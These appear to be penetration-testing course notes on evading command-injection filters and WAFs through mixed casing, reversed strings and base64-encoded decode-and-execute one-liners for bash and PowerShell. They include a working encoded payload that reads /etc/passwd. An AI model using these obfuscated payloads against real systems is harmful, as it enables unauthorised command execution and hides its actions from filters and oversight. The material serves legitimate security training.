# Advanced Command Obfuscation


---

## Overview

- For advanced filters/WAFs, basic bypasses may not be enough.
- More advanced obfuscation techniques make injected commands harder to detect.

---

## Case Manipulation

- Invert or alternate character casing: `WHOAMI`, `WhOaMi`.
- Works because blacklists often don't check every case variation.

### Windows

- CMD and PowerShell are **case-insensitive** — casing doesn't matter at all.

```powershell
WhOaMi
# 21y4d
```

### Linux (case-sensitive — needs a trick)

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
# 21y4d
```

- `tr` converts the mixed-case string to all-lowercase, then executes it in a sub-shell.
- **Gotcha:** this command contains **spaces**, which may itself be filtered — replace with **tabs (`%09`)** to get it working through the injection point.
- Alternative one-liner:

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

**Exercise:** Test the above on a Linux VM, then adapt it to avoid filtered characters on the web app.

## Reversed Commands

- Write the command **reversed** (e.g., `imaohw` instead of `whoami`) to dodge an exact-match blacklist, then reverse it back at execution time.

### Linux

```bash
echo 'whoami' | rev
# imaohw

$(rev<<<'imaohw')
# 21y4d
```

- **Tip:** if also bypassing a character filter, reverse those characters too (or include them when reversing the original command).

### Windows (PowerShell)

```powershell
"whoami"[-1..-20] -join ''
# imaohw

iex "$('imaohw'[-1..-20] -join '')"
# 21y4d
```

## Encoded Commands

- Best for commands containing filtered characters, or where URL-decoding by the server might mangle the payload.
- Encode the payload (base64 or hex), then decode + execute in a sub-shell. Encoding is **unique per case** → less likely to match any known filter signature.

### Linux Example

```bash
echo -n 'cat /etc/passwd | grep 33' | base64
# Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

- **Tip:** `<<<` is used instead of a pipe `|` to avoid the filtered pipe character.
- If `bash` or `base64` themselves are filtered, bypass with earlier character-insertion techniques, or substitute: `sh` instead of `bash`, `openssl` instead of `base64`, `xxd` for hex decoding.

### Windows Example

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
# dwBoAG8AYQBtAGkA
```

Linux equivalent (convert UTF-8 → UTF-16LE before base64, to match Windows' Unicode encoding):

```bash
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
# dwBoAG8AYQBtAGkA
```

Decode and execute in PowerShell:

```powershell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
# 21y4d
```

## Key Takeaways

| Technique | Idea | Platform |
|---|---|---|
| Case manipulation | Mixed/alternating case; case-insensitive on Windows, needs `tr`/`${var,,}` on Linux | Both |
| Reversed commands | Write backwards, reverse back via `rev` (Linux) or `-join`/array slicing (PowerShell) in a sub-shell | Both |
| Encoded commands | base64/hex encode payload, decode + execute in a sub-shell | Both |

- Creativity matters — custom, never-seen-before obfuscation is less likely to match known filter/WAF signatures.
- Other techniques not covered in depth: **wildcards, regex, output redirection, integer expansion** — see **PayloadsAllTheThings** for more.
- Tools exist to **automate** command obfuscation (covered in the next section).
